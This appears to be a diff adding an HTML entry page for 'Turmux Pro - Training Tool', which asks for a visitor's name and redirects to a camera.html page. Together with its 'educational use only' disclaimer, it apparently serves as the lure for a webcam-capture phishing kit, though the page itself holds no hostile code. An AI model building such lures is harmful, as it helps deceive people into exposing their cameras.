@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Turmux Pro | Entry</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .card {
+      width: 90%;
+      max-width: 400px;
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.15);
+      text-align: center;
+      padding: 30px 20px;
+      border-top: 4px solid #c70000;
+    }
+    .card h2 {
+      margin-top: 0;
+      color: #c70000;
+      font-size: 20px;
+    }
+    .card p {
+      margin: 15px 0;
+      color: #333;
+      font-size: 14px;
+    }
+    .start-btn {
+      margin-top: 20px;
+      background-color: #c70000;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 15px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .start-btn:hover {
+      background-color: #a00000;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>🎯 Turmux Pro - Training Tool</h2>
+    <p>This tool is intended for educational use only.</p>
+    <p>By continuing, you agree to use it ethically.</p>
+    <button class="start-btn" onclick="redirect()">Start Training</button>
+  </div>
+  <script>
+    function redirect() {
+      const name = prompt("Enter your name:");
+      if (name) {
+        window.location.href = "camera.html?name=" + encodeURIComponent(name);
+      }
+    }
+  </script>
+</body>
+</html>
